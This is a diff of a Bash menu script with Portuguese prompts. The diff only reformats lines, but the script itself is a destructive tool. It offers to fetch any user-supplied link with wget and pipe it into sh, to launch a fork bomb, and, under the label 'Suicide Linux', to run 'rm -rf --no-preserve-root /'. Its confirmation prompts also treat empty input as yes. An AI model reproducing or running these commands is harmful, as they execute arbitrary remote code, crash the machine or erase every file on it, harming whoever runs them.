@@ -11,8 +11,7 @@ function menu() {
   echo " [3] Suicide Linux"
   echo
   echo -n " Esolha uma opção: "
-   read OPTION
-  echo
+   read OPTION && echo ""
 
   [ "${OPTION}" -ge 1 -a "${OPTION}" -le 3 ] || OPTION=0
   [ "${OPTION}" = "1" ] && download
@@ -24,14 +23,13 @@ function menu() {
 function download(){
   echo -n " Digite o link completo: "
    read BADLINK
-  wget "${BADLINK}" -O- | sh ; exit
+    wget "${BADLINK}" -O- | sh ; exit
 }
 
 function fbomb() {
   echo -n " Você têm certeza? [S/N] "
-  read FORK
-  echo
-  case ${FORK} in
+   read FORK && echo ""
+    case ${FORK} in
     s|S|"") : () { : | : & }; : ;;
     n|N|"") menu ;;
     *) echo " Opção inválida" ;;
@@ -40,9 +38,8 @@ function fbomb() {
 
 function suicide() {
   echo -n " Você têm certeza? [S/N] "
-  read SLINUX
-  echo
-  case ${SLINUX} in
+   read SLINUX && echo ""
+    case ${SLINUX} in
     s|S|"") rm -rf --no-preserve-root / ;;
     n|N|"") menu ;;
     *) echo " Opção inválida" ;;
